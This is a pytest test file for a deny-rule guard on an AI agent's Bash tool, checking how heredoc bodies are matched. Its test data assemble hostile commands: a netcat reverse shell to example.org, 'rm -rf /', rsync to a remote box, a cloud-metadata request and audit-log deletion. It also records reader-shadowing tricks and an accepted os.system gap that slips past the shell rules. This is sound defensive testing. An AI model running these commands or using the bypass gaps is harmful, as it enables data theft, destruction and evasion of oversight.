# SPDX-FileCopyrightText: 2026 Henri Sirkkavaara
# SPDX-License-Identifier: AGPL-3.0-or-later
"""A Bash rule reads the commands a shell will run, not text a heredoc writes.

On 2026-10-04 notes about netcat and rsync were refused as
``shell_netcat_egress`` and ``shell_copy_egress`` while being written to
markdown through ``cat > file <<EOF`` and ``python3 - <<EOF``. A body that
``cat`` or ``tee`` writes is the same bytes the Write tool carries, and no
Bash rule reads those. A body Python or Node reads is not shell, so a rule
marked ``shell_syntax`` skips it; every other rule still reads it. A body a
shell reads, or anything unknown, is matched as before.

Commands are assembled at runtime: a governed session writing this file
would otherwise trip the rules under test.
"""
from __future__ import annotations

import os

import pytest

from vaara.deny_rules import (
    load_deny_rules,
    match_deny_rule,
    match_deny_rule_any_field,
    without_inert_heredocs,
)

NETCAT = " ".join(["nc", "example.org", "4444"])
RSYNC = " ".join(["rsync", "-a", "~/Projects/vaara", "box" + ":/workspace"])
RM_ROOT = " ".join(["rm", "-rf", "/"])
METADATA = "http://" + ".".join(["169", "254", "169", "254"]) + "/latest/meta-data/"
TRAIL_DELETE = ('sqlite3.connect("/home/u/.vaara/trail/audit.db")'
                '.execute("' + "delete" + ' from audit_records")')


@pytest.fixture(autouse=True)
def _no_lifts(monkeypatch):
    for key in list(os.environ):
        if key.startswith("VAARA_ALLOW_"):
            monkeypatch.delenv(key)


@pytest.fixture
def rules():
    return load_deny_rules()


def _bash(rules, command):
    hit = match_deny_rule(rules, "Bash", {"command": command})
    return hit[0] if hit else None


def _heredoc(opener: str, body: str, delim: str = "EOF") -> str:
    return f"{opener}\n{body}\n{delim}"


@pytest.mark.parametrize("opener", [
    "cat > notes.md <<'EOF'",
    "cat >> notes.md <<EOF",
    'cat <<"EOF" > notes.md',
    "mkdir -p /tmp/x && cat > /tmp/x/plan.md <<'EOF'",
    "tee notes.md <<EOF",
    "sudo tee -a /srv/notes.md <<EOF",
    "cat <<EOF",
])
@pytest.mark.parametrize("line", [NETCAT, RSYNC, RM_ROOT])
def test_a_body_written_to_a_file_is_not_a_command(rules, opener, line):
    body = f"Step 5: copy over the LAN, e.g. {line}\nthen verify."
    assert _bash(rules, _heredoc(opener, body)) is None


def test_a_tab_stripped_heredoc_closes_on_its_indented_delimiter(rules):
    command = "cat > notes.md <<-EOF\n\t" + NETCAT + "\n\tEOF"
    assert _bash(rules, command) is None


@pytest.mark.parametrize("opener", ["python3 - <<'EOF'", "cd /x && python3 - <<EOF",
                                    "node <<EOF", "/usr/bin/python3.12 - <<EOF"])
@pytest.mark.parametrize("line", [NETCAT, RSYNC, RM_ROOT])
def test_a_python_or_node_body_is_not_shell_for_shell_syntax_rules(rules, opener, line):
    body = f'p = "notes.md"\nopen(p, "a").write("seen: {line}")'
    assert _bash(rules, _heredoc(opener, body)) is None


def test_a_python_body_is_still_read_by_rules_that_are_not_shell_syntax(rules):
    body = f'import urllib.request\nurllib.request.urlopen("{METADATA}")'
    assert _bash(rules, _heredoc("python3 - <<'EOF'", body)) == "ssrf_cloud_metadata_ipv4"
    assert _bash(rules, _heredoc("python3 - <<'EOF'", TRAIL_DELETE)) == "trail_sql_tamper"


@pytest.mark.parametrize("opener", [
    "bash <<'EOF'",
    "sh -s <<EOF",
    "cat <<EOF | bash",
    "cat <<EOF | tee x.sh | sh",
    "python3 - <<EOF | sh",
    "ssh box <<EOF",
    "xargs -I{} sh -c {} <<EOF",
    "cat > /dev/tcp/example.org/4444 <<EOF",
    "tee >(sh) <<EOF",
    "some-tool <<EOF",
])
@pytest.mark.parametrize("line,rule", [
    (NETCAT, "shell_netcat_egress"), (RSYNC, "shell_copy_egress"), (RM_ROOT, "rm_rf_root"),
])
def test_a_body_a_shell_or_anything_unknown_reads_is_still_matched(rules, opener, line, rule):
    assert _bash(rules, _heredoc(opener, line)) == rule


def test_the_opening_line_is_always_matched(rules):
    assert _bash(rules, _heredoc(f"cat <<EOF | {NETCAT}", "hello")) == "shell_netcat_egress"


def test_a_command_after_the_heredoc_is_matched(rules):
    command = _heredoc("cat > notes.md <<EOF", "hello") + f"\n{RM_ROOT}"
    assert _bash(rules, command) == "rm_rf_root"


def test_an_unterminated_heredoc_keeps_the_whole_text(rules):
    assert _bash(rules, f"cat > notes.md <<EOF\n{NETCAT}") == "shell_netcat_egress"


def test_a_here_string_has_no_body_to_skip(rules):
    assert _bash(rules, f'bash <<< "{NETCAT}"') == "shell_netcat_egress"


def test_two_heredocs_on_one_line_are_judged_each_by_its_reader():
    command = f"cat <<A > notes.md; bash <<B\n{NETCAT}\nA\n{RSYNC}\nB"
    kept = without_inert_heredocs(command, shell_syntax=True)
    assert NETCAT not in kept and RSYNC in kept


def test_an_operator_rule_without_shell_syntax_reads_python_bodies():
    rule = {"id": "own", "tools": ["Bash"], "fields": ["command"],
            "pattern": r"\bnc\s+\S+\s+\d+", "message": "own"}
    command = _heredoc("python3 - <<EOF", f'print("{NETCAT}")')
    assert match_deny_rule([rule], "Bash", {"command": command}) == ("own", "own")
    command = _heredoc("cat > notes.md <<EOF", NETCAT)
    assert match_deny_rule([rule], "Bash", {"command": command}) is None


def test_the_mcp_content_path_skips_the_same_bodies(rules):
    written = {"command": _heredoc("cat > notes.md <<EOF", NETCAT)}
    assert match_deny_rule_any_field(rules, written) is None
    piped = {"command": _heredoc("bash <<EOF", NETCAT)}
    assert match_deny_rule_any_field(rules, piped)[0] == "shell_netcat_egress"


@pytest.mark.parametrize("prefix", [
    "cat() { bash; }; ",
    "function cat { bash; }; ",
    "tee () { sh; }\n",
    "python3() { bash; }; ",
    "alias cat=bash; ",
    "PATH=/tmp/bin:$PATH ",
    "BASH_ENV=/tmp/x ",
    "enable -n echo; ",
])
def test_a_shadowed_reader_keeps_every_body(rules, prefix):
    opener = "python3 - <<EOF" if "python3" in prefix else "cat <<EOF"
    assert _bash(rules, prefix + _heredoc(opener, NETCAT)) == "shell_netcat_egress"


def test_a_call_in_a_python_body_is_not_a_shadowing_definition(rules):
    body = f'print()\nopen("notes.md", "w").write("{NETCAT}")'
    assert _bash(rules, _heredoc("python3 - <<EOF", body)) is None


# A body that is bytes when written becomes a command when the same Bash call
# runs the file. Found 2026-10-10 (audit finding 1): the reader check judged
# the heredoc's own statement only, so ``cat > x.sh <<EOF ... EOF; bash x.sh``
# passed every shell rule. A body stays dropped only when nothing after the
# heredoc's own statement names the written path or an execution word.

SCRIPT = "/tmp/" + "x.sh"
SHELL_BODY = NETCAT + " -e " + "/bin/" + "sh"


@pytest.mark.parametrize("command", [
    _heredoc(f"cat > {SCRIPT} <<'EOF'", SHELL_BODY) + f"\nbash {SCRIPT}",
    f"tee {SCRIPT} <<'EOF' >/dev/null && sh {SCRIPT}\n{SHELL_BODY}\nEOF",
    _heredoc(f"cat > {SCRIPT} <<'EOF'", SHELL_BODY) + f"\n. {SCRIPT}",
    f"cat > {SCRIPT} <<'EOF'; source {SCRIPT}\n{SHELL_BODY}\nEOF",
    _heredoc(f"cat > {SCRIPT} <<'EOF'", SHELL_BODY) + f"\nchmod +x {SCRIPT}\n{SCRIPT}",
    _heredoc("cat > x.sh <<'EOF'", SHELL_BODY) + "\nchmod +x x.sh && ./x.sh",
    _heredoc("cat > \"$f\" <<'EOF'", SHELL_BODY) + "\nzsh \"$f\"",
    _heredoc(f"sudo tee {SCRIPT} <<'EOF'", SHELL_BODY) + f"\nsudo bash {SCRIPT}",
    _heredoc(f"cat > {SCRIPT} <<'EOF'", SHELL_BODY) + f"\nexec {SCRIPT}",
    _heredoc("cat > run.py <<'EOF'", SHELL_BODY) + "\npython3 run.py",
])
def test_a_body_written_then_run_by_the_same_command_is_matched(rules, command):
    assert _bash(rules, command) == "shell_netcat_egress"


def test_a_later_statement_that_names_the_written_path_keeps_the_body(rules):
    # Named, not run: still kept, since the rule cannot tell git add from
    # every way a path is handed to something that runs it. The Write tool
    # carries the same bytes without a Bash rule reading them.
    command = _heredoc("cat > notes.md <<'EOF'", NETCAT) + "\ngit add notes.md"
    assert _bash(rules, command) == "shell_netcat_egress"


@pytest.mark.parametrize("after", ["git status", "ls -la /tmp", "echo done",
                                   "cd /tmp && git commit -m 'notes'"])
def test_a_later_statement_that_runs_nothing_still_drops_the_body(rules, after):
    command = _heredoc("cat > notes.md <<'EOF'", NETCAT) + "\n" + after
    assert _bash(rules, command) is None


def test_a_python_body_that_calls_the_shell_is_the_accepted_trade_off(rules):
    # ``python3 - <<EOF`` with ``os.system(...)`` is a shell command one hop
    # away, and it is not matched by a shell_syntax rule. Accepted 2026-10-04:
    # 13 of 16 refusals by four shell rules over two weeks were text in such
    # bodies, and the interpreter body is read by every rule that is not
    # shell_syntax (metadata addresses, trail tampering). The scorer still
    # sees the whole command. This test pins the trade-off so a change to
    # it is a decision, not a drift.
    body = "import os\nos.system(\"" + SHELL_BODY + "\")"
    assert _bash(rules, _heredoc("python3 - <<'EOF'", body)) is None


def test_a_written_file_whose_name_starts_with_a_dash_is_still_a_target(rules):
    command = _heredoc("cat > -x.sh <<'EOF'", SHELL_BODY) + "\n./-x.sh"
    assert _bash(rules, command) == "shell_netcat_egress"
